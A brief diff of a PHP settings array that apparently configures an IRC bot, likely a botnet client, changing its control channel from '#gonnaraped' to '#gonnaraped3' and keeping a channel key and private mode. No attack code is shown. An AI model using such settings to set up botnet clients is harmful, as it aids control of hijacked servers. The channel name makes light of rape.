@@ -9,7 +9,7 @@
 			"pass"=> "",
 			"prefix"=> "",
 			"maxrand"=> 15,
-			"chan"=> "#gonnaraped",
+			"chan"=> "#gonnaraped3",
 			"key"=> "1587",
 			"modes"=> "+p",
 			"password"=> "",
